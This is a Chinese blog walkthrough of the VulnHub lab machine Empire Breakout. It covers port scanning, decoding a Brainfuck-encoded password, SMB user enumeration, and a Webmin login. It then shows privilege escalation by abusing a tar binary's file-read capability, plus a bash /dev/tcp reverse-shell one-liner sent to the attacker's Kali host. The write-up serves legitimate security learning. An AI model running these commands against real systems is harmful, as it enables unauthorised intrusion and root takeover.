
--- 
title:  [ vulnhub靶机通关篇 ] Empire Breakout 通关详解 
tags: []
categories: [] 

---
>  
 <h2>🍬 博主介绍</h2> 
 👨‍🎓 博主介绍：大家好，我是  ，很高兴认识大家~ ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！ Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。 




#### 文章目录
- - - <ul><li>- - - - - <ul><li>- - - - - - - - - - - - - - - - - 


## 一、环境搭建：

### 1、下载靶场环境

>  
 靶场下载地址： 


```
https://www.vulnhub.com/entry/empire-breakout,751/

```

>  
 下载下来的文件如下 


<img src="https://img-blog.csdnimg.cn/a46c89205dfa4c7fb456a3d40ae0cc00.png" alt="在这里插入图片描述">

### 2、启动靶场环境

>  
 下载下来是虚拟机压缩文件，直接用Vmvare导入就行。 


<img src="https://img-blog.csdnimg.cn/c2ad20c36ef44ce78d8f5b84a2e91f3e.png" alt="在这里插入图片描述">

>  
 设置虚拟机名称 


<img src="https://img-blog.csdnimg.cn/5c569567c5b143cda039a3816d6f8334.png" alt="在这里插入图片描述">

>  
 导入中 


<img src="https://img-blog.csdnimg.cn/052b21025bde4709a351cd24cd4bb9cc.png" alt="在这里插入图片描述">

>  
 导入完成之后打开后把网络模式设置为NAT模式。 虚拟机开启之后界面如下，我们可以看到虚拟机ip：192.168.233.175 


<img src="https://img-blog.csdnimg.cn/ab404ae2c065481886d9718d705093df.png" alt="在这里插入图片描述">

## 二、渗透靶场

### 1、目标：

>  
 目标就是我们搭建的靶场，靶场IP为： 


```
192.168.233.175

```

### 2、信息收集：查看端口和服务

>  
 Nmap扫描靶机查看开启的端口和服务 


```
nmap -sS -p 0-65535 -Pn -O 192.168.233.175

```

<img src="https://img-blog.csdnimg.cn/11da005601fb4902aa78d14066372bb4.png" alt="在这里插入图片描述">

>  
 发现开放了80端口，存在WEB， 开放了139，445端口，存在SMB共享服务 开启了10000、20000端口，存在Webmin MiniServ服务（Webmin 是功能强大的基于 Web 的 Unix/linux 系统管理工具。管理员通过浏览器访问 Webmin 的各种管理功能并完成相应的管理操作。） 


### 3、访问80端口发现提示信息得到一个密码

#### 1.访问一下web

```
http://192.168.233.175/

```

<img src="https://img-blog.csdnimg.cn/5686c28124584b16a0c7f0cf2832b069.png" alt="在这里插入图片描述">

#### 2.查看源码发现一段提示

```
&lt;!--don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.--&gt;

```

<img src="https://img-blog.csdnimg.cn/cbc0b6b41f2f42f7bd15d77f2da93a02.png" alt="在这里插入图片描述">

#### 3.翻译解密提示信息

>  
 提示的大概意思就是： 翻译过来时：别担心没有人会来这里，和你分享我的权限是安全的。它是加密的：） 也就是说这段奇奇怪怪的代码是加密文件，我们需要将他进行解密，这应该是密码经过某种加密或者编码形成的，经过一段时间的查找，发现是ook加密，是brainfuck加密方法的一种 我们进行解密：解密工具：https://ctf.bugku.com/tool/brainfuck 解密过后是： 


```
.2uqPEfj3D&lt;P’a-3

```

<img src="https://img-blog.csdnimg.cn/7ce6b5d5421c4f5cbec0554fd09652fd.png" alt="在这里插入图片描述">

#### 4.brainfuck 语言简介

>  
 brainfuck 语言用 &gt; &lt; + - . , [ ] 八种符号来替换C语言的各种语法和命令，具体规则如下： Brainfuck 编程语言由八个命令组成，每个命令都表示为一个字符。 


```
&gt; 增加指针。 
&lt; 减少指针。 
+ 增加指针处的字节。 
- 减少指针处的字节。 
. 输出指针处的字节。 
, 输入一个字节并将其存储在指针处的字节中。 
[ 跳过匹配项] 如果指针处的字节为零。 
] 向后跳转到匹配的 [ 除非指针处的字节为零。 
Brainfuck 命令的语义也可以用 C 语言简洁地表达，如下（假设 p 之前已定义为 char*）： 
&gt; 变为 ++p; 
&lt; 变成 --p; 
+ 变为 ++*p； 
- 变成 --*p; 
. 变成 putchar(*p); 
, 变成 *p = getchar(); 
[ 变成 while (*p) {<!-- --> 
] 变成 } 

```

### 4、访问10000和20000端口发现两个登录页

>  
 有一种强烈的预感，这是一段密码，先记录下来，接着我们继续查看另外两个网站 10000端口和20000端口是不同的登录系统，一个是登录网站的，一个是登录用户的 


#### 1.访问10000端口

```
https://192.168.233.175:10000/session_login.cgi

```

<img src="https://img-blog.csdnimg.cn/b43f187f48224b639f9924523120fa8b.png" alt="在这里插入图片描述">

#### 2.访问20000端口

```
https://192.168.233.175:20000/

```

<img src="https://img-blog.csdnimg.cn/bae00c04fdca47e885e4aa5393fa1f3a.png" alt="在这里插入图片描述">

### 5、收集有关靶机smb的信息获取到用户名cyber

#### 1.思路

>  
 鉴于我们已经有了用户的密码，所以我们要着手寻找用户名了 由于靶机开放了smb服务，所以我们可以收集有关靶机smb的信息 


#### 2.收集smb信息

>  
 使用命令enum4linux可以收集大量的信息 


```
enum4linux 192.168.233.175

```

<img src="https://img-blog.csdnimg.cn/433684908ea8480482f98b679be9ec5d.png" alt="在这里插入图片描述">

>  
 最终发现了一个用户名cyber 


<img src="https://img-blog.csdnimg.cn/d8e2b65eeba2424996ed79be925455a0.png" alt="在这里插入图片描述">

#### 3.Enum4linux介绍

>  
 Enum4linux是一个用于枚举来自Windows和Samba系统的信息的工具。 它试图提供与以前从www.bindview.com可用的enum.exe类似的功能。它是用Perl编写的，基本上是一个包装Samba工具smbclient，rpclient，net和nmblookup。 用法: 


```
./enum4linux.pl [选项] ip地址

枚举选项：
     -U        获取用户列表
     -M        获取机器列表*
     -S        获取共享列表
     -P        获取密码策略信息
     -G        获取组和成员列表
     -d        详述适用于-U和-S
     -u user   用户指定要使用的用户名（默认""）
     -p pass   指定要使用的密码（默认为""）

以下选项是enum.exe未实现的: -L, -N, -D, -f

其他选项:
    -a        做所有简单枚举（-U -S -G -P -r -o -n -i），如果您没有提供任何其他选项，则启用此选项
    -h        显示此帮助消息并退出
    -r        通过RID循环枚举用户
    -R range  RID范围要枚举（默认值：500-550,1000-1050，隐含-r）
    -K n      继续搜索RID，直到n个连续的RID与用户名不对应，Impies RID范围结束于999999.对DC有用
    -l        通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DN）
    -s        文件暴力猜测共享名称
    -k user   远程系统上存在的用户（默认值：administrator，guest，krbtgt，domain admins，root，bin，none）
              用于获取sid与“lookupsid known_username”
              使用逗号尝试几个用户：“-k admin，user1，user2”
    -o        获取操作系统信息
    -i        获取打印机信息
    -w wrkg   手动指定工作组（通常自动找到）
    -n        做一个nmblookup（类似于nbtstat）
-v        详细输出，显示正在运行的完整命令（net，rpcclient等）

```

### 6、利用获取的用户名和密码成功登录20000端口

>  
 由于20000端口是登录用户的，我们拿用户名cyber和之前获得的密码去登录一下20000端口，登陆成功 


<img src="https://img-blog.csdnimg.cn/314ec67e66bf454a88d2fd57b8646bed.png" alt="在这里插入图片描述">

### 7、获取普通用户权限获取第一个flag

>  
 登录进去摸索了一会儿，发现左下角有一个终端的图标，点进去之后就可以运行命令了 


<img src="https://img-blog.csdnimg.cn/0eb7672b4556467cbe8f82f6dd7ed6a9.png" alt="在这里插入图片描述">

>  
 进入命令行，执行ls发现有一个user.txt文件，使用cat查看，得到第一个flag 


```
ls
cat user.txt

```

<img src="https://img-blog.csdnimg.cn/4c7e8125dab94158b829a495cf935a6a.png" alt="在这里插入图片描述">

### 8、获取root用户权限获取第一个flag

#### 1.查看当前权限

>  
 执行whoami发现是用户权限 


```
whoami

```

<img src="https://img-blog.csdnimg.cn/77e2bc511d624c35ac0c52340d50492b.png" alt="在这里插入图片描述">

#### 2.发现tar可进行任意文件读取

>  
 通过ls -l查看文件权限，发现tar具有执行权限，猜想他是一个可执行文件 


```
ls -l

```

<img src="https://img-blog.csdnimg.cn/4951828db8fe42e784afc848748bbe4d.png" alt="在这里插入图片描述">

>  
 通过getcap命令查看文件拥有的权限是什么 


```
getcap tar

```

>  
 发现cap_dac_read _search=ep，说明他是可以读取任意文件的 


<img src="https://img-blog.csdnimg.cn/2cc0cab939574b17ba18c5180f20e660.png" alt="在这里插入图片描述">

#### 3.linux setcap命令的信息

```
https://blog.csdn.net/megan_free/article/details/100357702\

```

#### 4.发现备份文件.old_pass.bak

>  
 既然给了我们一个可进行任意读取的可执行文件，那就肯定是要我们找一个文件来读取，获得root的密码。 经过一段时间的寻找之后，发现/var/backups下有个备份文件.old_pass.bak 


<img src="https://img-blog.csdnimg.cn/8707bb1a1bc04213b432b16824f6a115.png" alt="在这里插入图片描述">

#### 5.利用tar读取密码备份文件

>  
 我们用tar把它打包之后再解压出来，就没有权限问题了 


```
./tar -cvf pass.tar /var/backups/.old_pass.bak
tar -xvf pass.tar

```

>  
 这里打包的时候一定要使用./tar，不然会提示没权限，没有加./代表的是你用的系统安装的tar不是这个目录下的tar，就不一定会有读取任意文件的权限 


<img src="https://img-blog.csdnimg.cn/20202df8fca84eeb8ea7b3c1d7f587f4.png" alt="在这里插入图片描述">

>  
 我们的用户目录下多了两个文件 


<img src="https://img-blog.csdnimg.cn/c2a36121804b43b4856a27c606dd7846.png" alt="在这里插入图片描述">

#### 6.成功读取root密码

```
cat var/backups/.old_pass.bak

```

>  
 得到root密码： 


```
Ts&amp;4&amp;YurgtRX(=~h

```

<img src="https://img-blog.csdnimg.cn/f6dcf98bfefb4c7ea18232c7adabd14f.png" alt="在这里插入图片描述">

#### 7.发现网页命令行无法执行su命令

>  
 切换到root用户 


```
su root

```

>  
 发现这里执行不了su 


<img src="https://img-blog.csdnimg.cn/3d1eb8c761284486a08921e76114cbeb.png" alt="在这里插入图片描述">

#### 8.反弹靶机shell到kali方式解决上述问题

>  
 反弹shell后 那那那，我干脆反弹一个shell到我的kali吧 Kali监听 


```
nc -lvvp 55555

```

<img src="https://img-blog.csdnimg.cn/89cae150962040bf864bc47edb9bcf25.png" alt="在这里插入图片描述">

>  
 靶机连接 


```
bash -i &gt;&amp; /dev/tcp/192.168.233.130/55555 0&gt;&amp;1

```

<img src="https://img-blog.csdnimg.cn/5ec2eaf3db37479b8ea74877b9189a04.png" alt="在这里插入图片描述">

>  
 攻击机获取到靶机的shell 


<img src="https://img-blog.csdnimg.cn/431389b41cb241fa8c888e617218385f.png" alt="在这里插入图片描述">

#### 9.使用root密码登录root用户，提权成功

>  
 切换到root用户 


```
su root

```

>  
 执行whoami 发现是root权限，提权成功 


<img src="https://img-blog.csdnimg.cn/b0f77695c91240b284aa5cd669a8470b.png" alt="在这里插入图片描述">

>  
 得到第二个flag 


```
cd /root
cat rOOt.txt

```

<img src="https://img-blog.csdnimg.cn/67ebd906a15f47f6b83b181a03c77207.png" alt="在这里插入图片描述">

## 三、相关资源

     
